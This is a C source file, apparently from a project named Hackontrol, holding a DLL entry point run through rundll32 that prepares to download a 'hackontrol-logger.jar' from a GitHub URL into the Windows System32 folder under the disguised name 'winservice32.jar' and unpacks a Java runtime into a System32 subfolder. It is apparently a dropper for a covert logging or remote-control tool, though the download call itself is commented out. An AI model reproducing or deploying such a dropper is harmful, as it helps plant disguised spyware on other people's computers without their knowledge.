#include <khopanwindows.h>
#include <khopanerror.h>
#include <khopanstring.h>
#include "downloadjar.h"
#include "extractor.h"

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define SYSTEM32         L"System32"
#define JAR_NAME         L"winservice32.jar"
#define RUNDLL32EXE      L"rundll32.exe"
#define LIBRARY_NAME     L"libdll32.dll"
#define JAVA_PATH_NAME    "jn" // Java runtime eNvironment
#define REMOTE_FILE_NAME L"hackontrol-logger.jar"

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPWSTR windowsDirectoryPath = KHGetWindowsDirectoryW();

	if(!windowsDirectoryPath) {
		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
		return;
	}
	
	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);

	if(!system32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeWindowsDirectoryPath;
	}

	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);

	if(!rundll32Path) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeSystem32Path;
	}

	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/" REMOTE_FILE_NAME L"," JAR_NAME, rundll32Path);

	if(!downloadArgument) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeRundll32Path;
	}

	/*if(DownloadJar(system32Path, rundll32Path, downloadArgument)) {
		goto freeDownloadArgument;
	}*/

	LPSTR javaDirectoryPath = KHFormatMessageA("%ws\\" JAVA_PATH_NAME, system32Path);

	if(!javaDirectoryPath) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		goto freeDownloadArgument;
	}

	if(!CreateDirectoryA(javaDirectoryPath, NULL)) {
		DWORD error = GetLastError();

		if(error != ERROR_ALREADY_EXISTS) {
			KHWin32DialogErrorW(error, L"KHFormatMessageW");
			goto freeJavaDirectoryPath;
		}
	}

	if(ExtractJRE(javaDirectoryPath)) {
		goto freeJavaDirectoryPath;
	}

	MessageBoxA(NULL, javaDirectoryPath, "Dialog", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
freeJavaDirectoryPath:
	FREE(javaDirectoryPath);
freeDownloadArgument:
	FREE(downloadArgument);
freeRundll32Path:
	FREE(rundll32Path);
freeSystem32Path:
	FREE(system32Path);
freeWindowsDirectoryPath:
	FREE(windowsDirectoryPath);
	/*STARTUPINFO startupInformationExecute = {0};
	startupInformationExecute.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformtionExecute = {0};

	if(CreateProcessW(execf, const_cast<wchar_t*>(execf), NULL, NULL, TRUE, 0, NULL, NULL, &startupInformationExecute, &processInformtionExecute) == 0) {
		HJ_DisplayError(GetLastError(), L"CreateProcessW()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hProcess) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
		return;
	}

	if(CloseHandle(processInformtionExecute.hThread) == 0) {
		HJ_DisplayError(GetLastError(), L"CloseHandle()");
	}*/
}
